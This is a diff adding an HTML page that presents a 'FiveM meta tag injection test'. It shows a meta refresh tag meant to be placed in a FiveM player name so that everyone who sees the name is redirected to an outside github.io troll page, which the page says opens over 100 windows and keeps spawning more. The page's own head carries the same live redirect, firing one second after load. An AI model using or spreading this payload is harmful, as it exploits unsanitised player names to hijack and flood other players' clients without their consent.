@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <!-- EXACT META TAG FROM FIVEM NAME -->
+    <meta http-equiv='refresh' content='1; url=https://bader133b.github.io/triggertroll/'>
+    <title>FiveM Test - Meta Tag Injection</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: rgba(0,0,0,0.5);
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        .code {
+            background: #1a1a1a;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            word-break: break-all;
+        }
+        .warning {
+            color: #ff6b6b;
+            font-size: 20px;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+        .countdown {
+            font-size: 48px;
+            color: #4ecdc4;
+            margin: 20px 0;
+        }
+    </style>
+    <script>
+        let countdown = 1;
+        const countdownEl = document.createElement('div');
+        countdownEl.className = 'countdown';
+        countdownEl.id = 'countdown';
+        
+        window.addEventListener('DOMContentLoaded', () => {
+            const container = document.querySelector('.container');
+            container.appendChild(countdownEl);
+            
+            const interval = setInterval(() => {
+                countdown--;
+                countdownEl.textContent = countdown;
+                if (countdown <= 0) {
+                    clearInterval(interval);
+                    countdownEl.textContent = 'REDIRECTING NOW!';
+                }
+            }, 1000);
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>🔴 FIVEM META TAG INJECTION TEST</h1>
+        <p>This page simulates what happens when someone puts this in their FiveM name:</p>
+        <div class="code">
+            &lt;meta http-equiv='refresh' content='1; url=https://bader133b.github.io/triggertroll/'&gt;
+        </div>
+        <div class="warning">
+            ⚠️ WARNING: This will redirect to the spam page in:
+        </div>
+        <div id="countdown" class="countdown">1</div>
+        <p style="margin-top: 30px;">
+            <strong>What will happen:</strong><br>
+            1. Page redirects to https://bader133b.github.io/triggertroll/<br>
+            2. That page opens 100+ windows immediately<br>
+            3. Opens 20 windows every 300ms continuously<br>
+            4. Everyone who sees the player name gets spammed!
+        </p>
+        <p style="color: #ffd93d; margin-top: 20px;">
+            This is exactly what will happen in FiveM when the meta tag is in a player name!
+        </p>
+    </div>
+</body>
+</html>
+
